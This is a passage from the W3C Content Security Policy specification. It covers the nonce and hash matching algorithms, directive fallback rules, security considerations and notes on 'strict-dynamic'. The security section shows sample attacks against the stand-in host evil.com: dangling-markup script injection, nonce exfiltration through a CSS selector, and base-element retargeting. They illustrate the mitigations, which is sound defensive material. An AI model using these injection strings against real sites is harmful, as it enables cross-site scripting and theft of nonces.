        [§ 8.2 Usage of \"\'strict-dynamic\'\"](#strict-dynamic-usage).

    3.  If `expression`{.variable} is an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive②①
        link-type="dfn"} match for the
        [`keyword-source`](#grammardef-keyword-source){#ref-for-grammardef-keyword-source⑤
        link-type="grammar"}
        \"[`'unsafe-inline'`](#grammardef-unsafe-inline){#ref-for-grammardef-unsafe-inline②
        link-type="grammar"}\", set `allow all inline`{.variable} to
        `true`.

3.  If `allow all inline`{.variable} is `true`, return \"`Allows`\".
    Otherwise, return \"`Does Not Allow`\".

::: {#example-c6b777a0 .example}
[](#example-c6b777a0){.self-link} [Source
lists](#source-lists){#ref-for-source-lists②⓪ link-type="dfn"} that
[allow all inline
behavior](#source-list-allows-all-inline-behavior){#ref-for-source-list-allows-all-inline-behavior
link-type="dfn"}:

    'unsafe-inline' http://a.com http://b.com
    'unsafe-inline'

[Source lists](#source-lists){#ref-for-source-lists②① link-type="dfn"}
that do not [allow all inline
behavior](#source-list-allows-all-inline-behavior){#ref-for-source-list-allows-all-inline-behavior①
link-type="dfn"} due to the presence of nonces and/or hashes, or absence
of \'`unsafe-inline`\':

    'sha512-321cba' 'nonce-abc'
    http://example.com 'unsafe-inline' 'nonce-abc'

[Source lists](#source-lists){#ref-for-source-lists②② link-type="dfn"}
that do not [allow all inline
behavior](#source-list-allows-all-inline-behavior){#ref-for-source-list-allows-all-inline-behavior②
link-type="dfn"} when `type`{.variable} is \'`script`\' or
\'`script attribute`\' due to the presence of \'`strict-dynamic`\', but
[allow all inline
behavior](#source-list-allows-all-inline-behavior){#ref-for-source-list-allows-all-inline-behavior③
link-type="dfn"} otherwise:

    'unsafe-inline' 'strict-dynamic'
    http://example.com 'strict-dynamic' 'unsafe-inline'
:::

##### [6.7.3.3. ]{.secno}[ Does `element`{.variable} match source list for `type`{.variable} and `source`{.variable}? ]{.content}[](#match-element-to-source-list){.self-link} {#match-element-to-source-list .algorithm .heading .settled algorithm="Does element match source list for type and source?" level="6.7.3.3"}

Given an
[`Element`{.idl}](https://dom.spec.whatwg.org/#element){#ref-for-element①⓪
link-type="idl"} `element`{.variable}, a [source
list](#source-lists){#ref-for-source-lists②③ link-type="dfn"}
`list`{.variable}, a string `type`{.variable}, and a string
`source`{.variable}, this algorithm returns \"`Matches`\" or
\"`Does Not Match`\".

[Note:]{.marker} Regardless of the encoding of the document,
`source`{.variable} will be converted to `UTF-8` before applying any
hashing algorithms.

1.  If [§ 6.7.3.2 Does a source list allow all inline behavior for
    type?](#allow-all-inline) returns \"`Allows`\" given
    `list`{.variable} and `type`{.variable}, return \"`Matches`\".

2.  If `type`{.variable} is \"`script`\" or \"`style`\", and [§ 6.7.3.1
    Is element nonceable?](#is-element-nonceable) returns
    \"`Nonceable`\" when executed upon `element`{.variable}:

    1.  [For
        each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate③⑦
        link-type="dfn"} `expression`{.variable} of `list`{.variable}:

        1.  If `expression`{.variable} matches the
            [`nonce-source`](#grammardef-nonce-source){#ref-for-grammardef-nonce-source⑦
            link-type="grammar"} grammar, and `element`{.variable} has a
            [`nonce`](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce){#ref-for-attr-nonce
            link-type="element-sub"} attribute whose value
            [is](https://infra.spec.whatwg.org/#string-is){#ref-for-string-is②
            link-type="dfn"} `expression`{.variable}'s
            [`base64-value`](#grammardef-base64-value){#ref-for-grammardef-base64-value⑥
            link-type="grammar"} part, return \"`Matches`\".

    [Note:]{.marker} Nonces only apply to inline
    [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script⑧
    link-type="element"} and inline
    [`style`](https://html.spec.whatwg.org/multipage/semantics.html#the-style-element){#ref-for-the-style-element①
    link-type="element"}, not to attributes of either element or to
    `javascript:` navigations.

3.  Let `unsafe-hashes flag`{.variable} be `false`.

4.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate③⑧
    link-type="dfn"} `expression`{.variable} of `list`{.variable}:

    1.  If `expression`{.variable} is an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive②②
        link-type="dfn"} match for the
        [`keyword-source`](#grammardef-keyword-source){#ref-for-grammardef-keyword-source⑥
        link-type="grammar"}
        \"[`'unsafe-hashes'`](#grammardef-unsafe-hashes){#ref-for-grammardef-unsafe-hashes
        link-type="grammar"}\", set `unsafe-hashes flag`{.variable} to
        `true`. Break out of the loop.

5.  If `type`{.variable} is \"`script`\" or \"`style`\", or
    `unsafe-hashes flag`{.variable} is `true`:

    1.  Set `source`{.variable} to the result of executing [UTF-8
        encode](https://encoding.spec.whatwg.org/#utf-8-encode){#ref-for-utf-8-encode
        link-type="dfn"} on the result of executing [JavaScript string
        converting](https://infra.spec.whatwg.org/#javascript-string-convert){#ref-for-javascript-string-convert
        link-type="dfn"} on `source`{.variable}.

    2.  [For
        each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate③⑨
        link-type="dfn"} `expression`{.variable} of `list`{.variable}:

        1.  If `expression`{.variable} is the
            \"[`'strict-dynamic'`](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic⑤
            link-type="grammar"}\"
            [keyword-source](#grammardef-keyword-source){#ref-for-grammardef-keyword-source⑦
            link-type="grammar"}:

            1.  If `type`{.variable} is \"`script`\", and
                `element`{.variable} is not
                [parser-inserted](https://html.spec.whatwg.org/multipage/scripting.html#parser-inserted){#ref-for-parser-inserted③
                link-type="dfn"}, return \"`Matches`\".

        2.  If `expression`{.variable} matches the
            [`hash-source`](#grammardef-hash-source){#ref-for-grammardef-hash-source⑦
            link-type="grammar"} grammar:

            1.  Let `algorithm`{.variable} be null.

            2.  If `expression`{.variable}'s
                [`hash-algorithm`](#grammardef-hash-algorithm){#ref-for-grammardef-hash-algorithm③
                link-type="grammar"} part is an [ASCII
                case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive②③
                link-type="dfn"} match for \"sha256\", set
                `algorithm`{.variable} to
                [SHA-256](https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#){#ref-for-something①
                link-type="dfn"}.

            3.  If `expression`{.variable}'s
                [`hash-algorithm`](#grammardef-hash-algorithm){#ref-for-grammardef-hash-algorithm④
                link-type="grammar"} part is an [ASCII
                case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive②④
                link-type="dfn"} match for \"sha384\", set
                `algorithm`{.variable} to
                [SHA-384](https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#){#ref-for-something②
                link-type="dfn" refhint-key="fe0b17c4"}.

            4.  If `expression`{.variable}'s
                [`hash-algorithm`](#grammardef-hash-algorithm){#ref-for-grammardef-hash-algorithm⑤
                link-type="grammar"} part is an [ASCII
                case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive②⑤
                link-type="dfn"} match for \"sha512\", set
                `algorithm`{.variable} to
                [SHA-512](https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#){#ref-for-something③
                link-type="dfn" refhint-key="6a5840b7"}.

            5.  If `algorithm`{.variable} is not null:

                1.  Let `actual`{.variable} be the result of [base64
                    encoding](https://tools.ietf.org/html/rfc4648#section-4){#ref-for-section-4①
                    link-type="dfn"} the result of applying
                    `algorithm`{.variable} to `source`{.variable}.

                2.  Let `expected`{.variable} be
                    `expression`{.variable}'s
                    [`base64-value`](#grammardef-base64-value){#ref-for-grammardef-base64-value⑦
                    link-type="grammar"} part, with all \'`-`\'
                    characters replaced with \'`+`\', and all \'`_`\'
                    characters replaced with \'`/`\'.

                    [Note:]{.marker} This replacement normalizes hashes
                    expressed in [base64url
                    encoding](https://tools.ietf.org/html/rfc4648#section-5){#ref-for-section-5①
                    link-type="dfn"} into [base64
                    encoding](https://tools.ietf.org/html/rfc4648#section-4){#ref-for-section-4②
                    link-type="dfn"} for matching.

                3.  If `actual`{.variable} is [identical
                    to](https://infra.spec.whatwg.org/#string-is){#ref-for-string-is③
                    link-type="dfn"} `expected`{.variable}, return
                    \"`Matches`\".

    [Note:]{.marker} Hashes apply to inline
    [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script⑨
    link-type="element"} and inline
    [`style`](https://html.spec.whatwg.org/multipage/semantics.html#the-style-element){#ref-for-the-style-element②
    link-type="element"}. If the
    \"[`'unsafe-hashes'`](#grammardef-unsafe-hashes){#ref-for-grammardef-unsafe-hashes①
    link-type="grammar"}\" source expression is present, they will also
    apply to event handlers, style attributes and `javascript:`
    navigations.

6.  Return \"`Does Not Match`\".

### [6.8. ]{.secno}[Directive Algorithms]{.content}[](#directive-algorithms){.self-link} {#directive-algorithms .heading .settled level="6.8"}

#### [6.8.1. ]{.secno}[ Get the effective directive for `request`{.variable} ]{.content}[](#effective-directive-for-a-request){.self-link} {#effective-directive-for-a-request .algorithm .heading .settled algorithm="Get the effective directive for request" level="6.8.1"}

Each [fetch directive](#fetch-directives){#ref-for-fetch-directives③
link-type="dfn"} controls a specific destination of
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑥③
link-type="dfn"}. Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑥④
link-type="dfn"} `request`{.variable}, the following algorithm returns
either null or the [name](#directive-name){#ref-for-directive-name①⑨
link-type="dfn"} of the request's [effective
directive]{#request-effective-directive .dfn .dfn-paneled
dfn-for="request" dfn-type="dfn" export=""}:

1.  If `request`{.variable}'s
    [initiator](https://fetch.spec.whatwg.org/#concept-request-initiator){#ref-for-concept-request-initiator②
    link-type="dfn"} is \"`prefetch`\" or \"`prerender`\", return
    `default-src`.

2.  Switch on `request`{.variable}'s
    [destination](https://fetch.spec.whatwg.org/#concept-request-destination){#ref-for-concept-request-destination⑨
    link-type="dfn"}, and execute the associated steps:

    the empty string

    :   1.  Return `connect-src`.

    \"`manifest`\"

    :   1.  Return `manifest-src`.

    \"`object`\"\
    \"`embed`\"

    :   1.  Return `object-src`.

    \"`frame`\"\
    \"`iframe`\"

    :   1.  Return `frame-src`.

    \"`audio`\"\
    \"`track`\"\
    \"`video`\"

    :   1.  Return `media-src`.

    \"`font`\"

    :   1.  Return `font-src`.

    \"`image`\"

    :   1.  Return `img-src`.

    \"`style`\"

    :   1.  Return `style-src-elem`.

    \"`script`\"\
    \"`xslt`\"\
    \"`audioworklet`\"\
    \"`paintworklet`\"

    :   1.  Return `script-src-elem`.

    \"`serviceworker`\"\
    \"`sharedworker`\"\
    \"`worker`\"

    :   1.  Return `worker-src`.

    \"`json`\"\
    \"`webidentity`\"

    :   1.  Return `connect-src`.

    \"`report`\"

    :   1.  Return null.

3.  Return `connect-src`.

[Note:]{.marker} The algorithm returns `connect-src` as a default
fallback. This is intended for new fetch destinations that are added and
which don't explicitly fall into one of the other categories.

#### [6.8.2. ]{.secno}[ Get the effective directive for inline checks ]{.content}[](#effective-directive-for-inline-check){.self-link} {#effective-directive-for-inline-check .algorithm .heading .settled algorithm="Get the effective directive for inline checks" level="6.8.2"}

Given a string `type`{.variable}, this algorithm returns the
[name](#directive-name){#ref-for-directive-name②⓪ link-type="dfn"} of
the effective directive.

[Note:]{.marker} While the [effective
directive](#request-effective-directive){#ref-for-request-effective-directive
link-type="dfn"} is only defined for
[requests](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑥⑤
link-type="dfn"}, in this algorithm it is used similarly to mean the
directive that is most relevant to a particular type of inline check.

1.  Switch on `type`{.variable}:

    \"`script`\"\
    \"`navigation`\"

    :   1.  Return `script-src-elem`.

    \"`script attribute`\"

    :   1.  Return `script-src-attr`.

    \"`style`\"

    :   1.  Return `style-src-elem`.

    \"`style attribute`\"

    :   1.  Return `style-src-attr`.

2.  Return null.

#### [6.8.3. ]{.secno}[ Get fetch directive fallback list ]{.content}[](#directive-fallback-list){.self-link} {#directive-fallback-list .algorithm .heading .settled algorithm="Get fetch directive fallback list" level="6.8.3"}

Will return an [ordered
set](https://infra.spec.whatwg.org/#ordered-set){#ref-for-ordered-set④
link-type="dfn"} of the fallback
[directives](#directives){#ref-for-directives③⑧ link-type="dfn"} for a
specific [directive](#directives){#ref-for-directives③⑨
link-type="dfn"}. The returned [ordered
set](https://infra.spec.whatwg.org/#ordered-set){#ref-for-ordered-set⑤
link-type="dfn"} is sorted from most relevant to least relevant and it
includes the effective directive itself.

Given a string `directive name`{.variable}:

1.  Switch on `directive name`{.variable}:

    \"`script-src-elem`\"

    :   1.  Return
            `<< "script-src-elem", "script-src", "default-src" >>`.

    \"`script-src-attr`\"

    :   1.  Return
            `<< "script-src-attr", "script-src", "default-src" >>`.

    \"`style-src-elem`\"

    :   1.  Return `<< "style-src-elem", "style-src", "default-src" >>`.

    \"`style-src-attr`\"

    :   1.  Return `<< "style-src-attr", "style-src", "default-src" >>`.

    \"`worker-src`\"

    :   1.  Return
            `<< "worker-src", "child-src", "script-src", "default-src" >>`.

    \"`connect-src`\"

    :   1.  Return `<< "connect-src", "default-src" >>`.

    \"`manifest-src`\"

    :   1.  Return `<< "manifest-src", "default-src" >>`.

    \"`object-src`\"

    :   1.  Return `<< "object-src", "default-src" >>`.

    \"`frame-src`\"

    :   1.  Return `<< "frame-src", "child-src", "default-src" >>`.

    \"`media-src`\"

    :   1.  Return `<< "media-src", "default-src" >>`.

    \"`font-src`\"

    :   1.  Return `<< "font-src", "default-src" >>`.

    \"`img-src`\"

    :   1.  Return `<< "img-src", "default-src" >>`.

2.  Return `<< >>`.

#### [6.8.4. ]{.secno}[ Should fetch directive execute ]{.content}[](#should-directive-execute){.self-link} {#should-directive-execute .algorithm .heading .settled algorithm="Should fetch directive execute" level="6.8.4"}

This algorithm is used for [fetch
directives](#fetch-directives){#ref-for-fetch-directives④
link-type="dfn"} to decide whether a directive should execute or defer
to a different directive that is better suited. For example: if the
`effective directive name`{.variable} is `worker-src` (meaning that we
are currently checking a worker request), a `default-src` directive
should not execute if a `worker-src` or `script-src` directive exists.

Given a string `effective directive name`{.variable}, a string
`directive name`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑦⑤
link-type="dfn"} `policy`{.variable}:

1.  Let `directive fallback list`{.variable} be the result of executing
    [§ 6.8.3 Get fetch directive fallback
    list](#directive-fallback-list) on
    `effective directive name`{.variable}.

2.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate④⓪
    link-type="dfn"} `fallback directive`{.variable} of
    `directive fallback list`{.variable}:

    1.  If `directive name`{.variable} is
        `fallback directive`{.variable}, Return \"`Yes`\".

    2.  If `policy`{.variable} contains a directive whose
        [name](#directive-name){#ref-for-directive-name②①
        link-type="dfn"} is `fallback directive`{.variable}, Return
        \"`No`\".

3.  Return \"`No`\".
:::::::::::::::::::

::::: section
## [7. ]{.secno}[Security and Privacy Considerations]{.content}[](#security-considerations){.self-link} {#security-considerations .heading .settled level="7"}

### [7.1. ]{.secno}[Nonce Reuse]{.content}[](#security-nonces){.self-link} {#security-nonces .heading .settled level="7.1"}

Nonces override the other restrictions present in the directive in which
they're delivered. It is critical, then, that they remain unguessable,
as bypassing a resource's policy is otherwise trivial.

If a server delivers a
[nonce-source](#grammardef-nonce-source){#ref-for-grammardef-nonce-source⑧
link-type="grammar"} expression as part of a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑦⑥
link-type="dfn"}, the server MUST generate a unique value each time it
transmits a policy. The generated value SHOULD be at least 128 bits long
(before encoding), and SHOULD be generated via a cryptographically
secure random number generator in order to ensure that the value is
difficult for an attacker to predict.

[Note:]{.marker} Using a nonce to allow inline script or style is less
secure than not using a nonce, as nonces override the restrictions in
the directive in which they are present. An attacker who can gain access
to the nonce can execute whatever script they like, whenever they like.
That said, nonces provide a substantial improvement over
[\'unsafe-inline\'](#grammardef-unsafe-inline){#ref-for-grammardef-unsafe-inline③
link-type="grammar"} when layering a content security policy on top of
old code. When considering
[\'unsafe-inline\'](#grammardef-unsafe-inline){#ref-for-grammardef-unsafe-inline④
link-type="grammar"}, authors are encouraged to consider nonces (or
hashes) instead.

### [7.2. ]{.secno}[Nonce Hijacking]{.content}[](#security-nonce-hijacking){.self-link} {#security-nonce-hijacking .heading .settled level="7.2"}

#### [7.2.1. ]{.secno}[Dangling markup attacks]{.content}[](#dangling-markup-attacks){.self-link} {#dangling-markup-attacks .heading .settled level="7.2.1"}

Dangling markup attacks such as those discussed in
[\[FILEDESCRIPTOR-2015\]](#biblio-filedescriptor-2015 "CSP 2015"){link-type="biblio"}
can be used to repurpose a page's legitimate nonces for injections. For
example, given an injection point before a
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script①⓪
link-type="element"} element:

``` highlight
<p>Hello, [INJECTION POINT]</p>
<script nonce=abc src=/good.js></script>
```

If an attacker injects the string
\"`<script src='https://evil.com/evil.js' `\", then the browser will
receive the following:

``` highlight
<p>Hello, <script src='https://evil.com/evil.js' </p>
<script nonce=abc src=/good.js></script>
```

It will then parse that code, ending up with a
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script①①
link-type="element"} element with a `src` attribute pointing to a
malicious payload, an attribute named `</p>`, an attribute named
\"`<script`\", a `nonce` attribute, and a second `src` attribute which
is helpfully discarded as duplicate by the parser.

The [§ 6.7.3.1 Is element nonceable?](#is-element-nonceable) algorithm
attempts to mitigate this specific attack by walking through
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script①②
link-type="element"} or
[`style`](https://html.spec.whatwg.org/multipage/semantics.html#the-style-element){#ref-for-the-style-element③
link-type="element"} element attributes, looking for the string
\"`<script`\" or \"`<style`\" in their names or values.

User-agents must pay particular attention when implementing this
algorithm to not ignore duplicate attributes. If an element has a
duplicate attribute any instance of the attribute after the first one is
ignored but in the [§ 6.7.3.1 Is element
nonceable?](#is-element-nonceable) algorithm, all attributes including
the duplicate ones need to be checked.

[](#issue-74cb0fbd){.self-link} Currently the HTML spec's parsing
algorithm removes this information before the [§ 6.7.3.1 Is element
nonceable?](#is-element-nonceable) algorithm can be run which makes it
impossible to actually detect duplicate attributes. [\[whatwg/html Issue
#3257\]](https://github.com/whatwg/html/issues/3257)

For the following example page:

``` highlight
Hello, [INJECTION POINT]
<script nonce=abc src=/good.js></script>
```

The following injected string will use a duplicate attribute to attempt
to bypass the [§ 6.7.3.1 Is element nonceable?](#is-element-nonceable)
algorithm check:

``` highlight
Hello, <script src='https://evil.com/evil.js' x="" x=
<script nonce="abcd" src=/good.js></script>
```

#### [7.2.2. ]{.secno}[Nonce exfiltration via content attributes]{.content}[](#nonce-exfiltration-content-attributes){.self-link} {#nonce-exfiltration-content-attributes .heading .settled level="7.2.2"}

Some attacks on CSP rely on the ability to exfiltrate nonce data via
various mechanisms that can read content attributes. CSS selectors are
the best example: through clever use of prefix/postfix text matching
selectors values can be sent out to an attacker's server for reuse.
Example:

``` highlight
script[nonce=a] { background: url("https://evil.com/nonce?a");}
```

The
[`nonce`](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce){#ref-for-attr-nonce①
link-type="element-sub"} section talks about mitigating these types of
attacks by hiding the nonce from the element's content attribute and
moving it into an internal slot. This is done to ensure that the `nonce`
value is exposed to scripts but not any other non-script channels.

### [7.3. ]{.secno}[Nonce Retargeting]{.content}[](#security-nonce-retargeting){.self-link} {#security-nonce-retargeting .heading .settled level="7.3"}

Nonces bypass
[host-source](#grammardef-host-source){#ref-for-grammardef-host-source⑤
link-type="grammar"} expressions, enabling developers to load code from
any origin. This, generally, is fine, and desirable from the developer's
perspective. However, if an attacker can inject a
[`base`](https://html.spec.whatwg.org/multipage/semantics.html#the-base-element){#ref-for-the-base-element③
link-type="element"} element, then an otherwise safe page can be
subverted when relative URLs are resolved. That is, on
`https://example.com/` the following code will load
`https://example.com/good.js`:

``` highlight
<script nonce=abc src=/good.js></script>
```

However, the following will load `https://evil.com/good.js`:

``` highlight
<base href="https://evil.com">
<script nonce=abc src=/good.js></script>
```

To mitigate this risk, it is advisable to set an explicit
[`base`](https://html.spec.whatwg.org/multipage/semantics.html#the-base-element){#ref-for-the-base-element④
link-type="element"} element on every page, or to limit the ability of
an attacker to inject their own
[`base`](https://html.spec.whatwg.org/multipage/semantics.html#the-base-element){#ref-for-the-base-element⑤
link-type="element"} element by setting a
[`base-uri`](#base-uri){#ref-for-base-uri① link-type="dfn"} directive in
your page's policy. For example, `base-uri 'none'`.

### [7.4. ]{.secno}[CSS Parsing]{.content}[](#security-css-parsing){.self-link} {#security-css-parsing .heading .settled level="7.4"}

The [style-src](#style-src){#ref-for-style-src link-type="dfn"}
directive restricts the locations from which the protected resource can
load styles. However, if the user agent uses a lax CSS parsing
algorithm, an attacker might be able to trick the user agent into
accepting malicious \"stylesheets\" hosted by an otherwise trustworthy
origin.

These attacks are similar to the CSS cross-origin data leakage attack
described by Chris Evans in 2009
[\[CSS-ABUSE\]](#biblio-css-abuse "Generic cross-browser cross-domain theft"){link-type="biblio"}.
User agents SHOULD defend against both attacks using the same mechanism:
stricter CSS parsing rules for style sheets with improper MIME types.

### [7.5. ]{.secno}[Violation Reports]{.content}[](#security-violation-reports){.self-link} {#security-violation-reports .heading .settled level="7.5"}

The violation reporting mechanism in this document has been designed to
mitigate the risk that a malicious web site could use violation reports
to probe the behavior of other servers. For example, consider a
malicious web site that allows `https://example.com` as a source of
images. If the malicious site attempts to load
`https://example.com/login` as an image, and the `example.com` server
redirects to an identity provider (e.g. `identityprovider.example.net`),
CSP will block the request. If violation reports contained the full
blocked URL, the violation report might contain sensitive information
contained in the redirected URL, such as session identifiers or
purported identities. For this reason, the user agent includes only the
URL of the original request, not the redirect target.

Note also that violation reports should be considered
attacker-controlled data. Developers who wish to collect violation
reports in a dashboard or similar service should be careful to properly
escape their content before rendering it (and should probably themselves
use CSP to further mitigate the risk of injection). This is especially
true for the \"`script-sample`\" property of violation reports, and the
[`sample`{.idl}](#dom-securitypolicyviolationevent-sample){#ref-for-dom-securitypolicyviolationevent-sample②
link-type="idl"} property of
[`SecurityPolicyViolationEvent`{.idl}](#securitypolicyviolationevent){#ref-for-securitypolicyviolationevent③
link-type="idl"}, which are both completely attacker-controlled strings.

### [7.6. ]{.secno}[Paths and Redirects]{.content}[](#source-list-paths-and-redirects){.self-link} {#source-list-paths-and-redirects .heading .settled level="7.6"}

To avoid leaking path information cross-origin (as discussed in Egor
Homakov's [Using Content-Security-Policy for
Evil](https://homakov.blogspot.de/2014/01/using-content-security-policy-for-evil.html)),
the matching algorithm ignores the path component of a source expression
if the resource being loaded is the result of a redirect. For example,
given a page with an active policy of
[`img-src`](#img-src){#ref-for-img-src③
link-type="dfn"}` example.com example.org/path`:

- Directly loading `https://example.org/not-path` would fail, as it
  doesn't match the policy.

- Directly loading `https://example.com/redirector` would pass, as it
  matches `example.com`.

- Assuming that `https://example.com/redirector` delivered a redirect
  response pointing to `https://example.org/not-path`, the load would
  succeed, as the initial URL matches `example.com`, and the redirect
  target matches `example.org/path` if we ignore its path component.

This restriction reduces the granularity of a document's policy when
redirects are in play, a necessary compromise to avoid brute-forced
information leaks of this type.

The relatively long thread [\"Remove paths from
CSP?\"](https://lists.w3.org/Archives/Public/public-webappsec/2014Feb/0036.html)
from public-webappsec@w3.org has more detailed discussion around
alternate proposals.

### [7.7. ]{.secno}[Secure Upgrades]{.content}[](#security-secure-upgrades){.self-link} {#security-secure-upgrades .heading .settled level="7.7"}

To mitigate one variant of history-scanning attacks like Yan Zhu's
[Sniffly](http://diracdeltas.github.io/sniffly/), CSP will not allow
pages to lock themselves into insecure URLs via policies like
`script-src http://example.com`. As described in [§ 6.7.2.9 scheme-part
matching](#match-schemes), the scheme portion of a source expression
will always allow upgrading to a secure variant.

### [7.8. ]{.secno}[ CSP Inheriting to avoid bypasses ]{.content}[](#security-inherit-csp){.self-link} {#security-inherit-csp .heading .settled level="7.8"}

Documents loaded from [local
schemes](https://fetch.spec.whatwg.org/#local-scheme){#ref-for-local-scheme②
link-type="dfn"} will inherit a copy of the policies in the source
document. The goal is to ensure that a page can't bypass its policy by
embedding a frame or opening a new window containing content that is
entirely under its control (`srcdoc` documents, `blob:` or `data:` URLs,
`about:blank` documents that can be manipulated via `document.write()`,
etc).

::: {#example-d8547a52 .example}
[](#example-d8547a52){.self-link} If this would not happen a page could
execute inline scripts even without `unsafe-inline` in the page's
execution context by simply embedding a `srcdoc` `iframe`.

``` highlight
<iframe srcdoc="<script>alert(1);</script>"></iframe>
```
:::

Note that we create a copy of the [CSP
list](#global-object-csp-list){#ref-for-global-object-csp-list①①
link-type="dfn"} which means that the new
[`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document①④
link-type="idl"}'s [CSP
list](#global-object-csp-list){#ref-for-global-object-csp-list①②
link-type="dfn"} is a snapshot of the relevant policies at its creation
time. Modifications in the [CSP
list](#global-object-csp-list){#ref-for-global-object-csp-list①③
link-type="dfn"} of the new
[`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document①⑤
link-type="idl"} won't affect the source
[`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document①⑥
link-type="idl"}'s [CSP
list](#global-object-csp-list){#ref-for-global-object-csp-list①④
link-type="dfn"} or vice-versa.

::: {#example-46761516 .example}
[](#example-46761516){.self-link} In the example below the image inside
the iframe will not load because it is blocked by the policy in the
`meta` tag of the iframe. The image outside the iframe will load
(assuming the main page policy does not block it) since the policy
inserted in the iframe will not affect it.

``` highlight
<iframe srcdoc='<meta http-equiv="Content-Security-Policy" content="img-src example.com;">
                   <img src="not-example.com/image">'></iframe>

<img src="not-example.com/image">
```
:::
:::::

::::::::::::::::: section
## [8. ]{.secno}[Authoring Considerations]{.content}[](#authoring-considerations){.self-link} {#authoring-considerations .heading .settled level="8"}

### [8.1. ]{.secno}[ The effect of multiple policies ]{.content}[](#multiple-policies){.self-link} {#multiple-policies .heading .settled level="8.1"}

*This section is not normative.*

The above sections note that when multiple policies are present, each
must be enforced or reported, according to its type. An example will
help clarify how that ought to work in practice. The behavior of an
`XMLHttpRequest` might seem unclear given a site that, for whatever
reason, delivered the following HTTP headers:

::: {#example-7bb4ce67 .example}
[](#example-7bb4ce67){.self-link}

    Content-Security-Policy: default-src 'self' http://example.com http://example.net;
                             connect-src 'none';
    Content-Security-Policy: connect-src http://example.com/;
                             script-src http://example.com/
:::

Is a connection to example.com allowed or not? The short answer is that
the connection is not allowed. Enforcing both policies means that a
potential connection would have to pass through both unscathed. Even
though the second policy would allow this connection, the first policy
contains `connect-src 'none'`, so its enforcement blocks the connection.
The impact is that adding additional policies to the list of policies to
enforce can *only* further restrict the capabilities of the protected
resource.

To demonstrate that further, consider a script tag on this page. The
first policy would lock scripts down to `'self'`, `http://example.com`
and `http://example.net` via the `default-src` directive. The second,
however, would only allow script from `http://example.com/`. Script will
only load if it meets both policy's criteria: in this case, the only
origin that can match is `http://example.com`, as both policies allow
it.

### [8.2. ]{.secno}[ Usage of \"`'strict-dynamic'`\" ]{.content}[](#strict-dynamic-usage){.self-link} {#strict-dynamic-usage .heading .settled level="8.2"}

*This section is not normative.*

Host- and path-based policies are tough to get right, especially on
sprawling origins like CDNs. The [solutions to Cure53's H5SC
Minichallenge 3: \"Sh\*t, it's
CSP!\"](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22#107-bytes)
[\[H5SC3\]](#biblio-h5sc3 "H5SC Minichallenge 3: "Sh*t, it's CSP!""){link-type="biblio"}
are good examples of the kinds of bypasses which such policies can
enable, and though CSP is capable of mitigating these bypasses via
exhaustive declaration of specific resources, those lists end up being
brittle, awkward, and difficult to implement and maintain.

The
\"[`'strict-dynamic'`](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic⑥
link-type="grammar"}\" source expression aims to make Content Security
Policy simpler to deploy for existing applications who have a high
degree of confidence in the scripts they load directly, but low
confidence in their ability to provide a reasonable list of resources to
load up front.

If present in a [`script-src`](#script-src){#ref-for-script-src②
link-type="dfn"} or [`default-src`](#default-src){#ref-for-default-src⑤
link-type="dfn"} directive, it has two main effects:

1.  [host-source](#grammardef-host-source){#ref-for-grammardef-host-source⑥
    link-type="grammar"} and
    [scheme-source](#grammardef-scheme-source){#ref-for-grammardef-scheme-source④
    link-type="grammar"} expressions, as well as the
    \"[`'unsafe-inline'`](#grammardef-unsafe-inline){#ref-for-grammardef-unsafe-inline⑤
    link-type="grammar"}\" and
    \"[`'self'`](#grammardef-self){#ref-for-grammardef-self②⑨
    link-type="grammar"}
    [keyword-source](#grammardef-keyword-source){#ref-for-grammardef-keyword-source⑧
    link-type="grammar"}s will be ignored when loading script.

    [hash-source](#grammardef-hash-source){#ref-for-grammardef-hash-source⑧
    link-type="grammar"} and
    [nonce-source](#grammardef-nonce-source){#ref-for-grammardef-nonce-source⑨
    link-type="grammar"} expressions will be honored.

2.  Script requests which are triggered by
    non-[\"parser-inserted\"](https://html.spec.whatwg.org/#parser-inserted){#ref-for-parser-inserted④
    link-type="dfn"}
    [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script①③
    link-type="element"} elements are allowed.

The first change allows you to deploy
\"[`'strict-dynamic'`](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic⑦
link-type="grammar"}\" in a backwards compatible way, without requiring
user-agent sniffing: the policy
`'unsafe-inline' https: 'nonce-abcdefg' 'strict-dynamic'` will act like
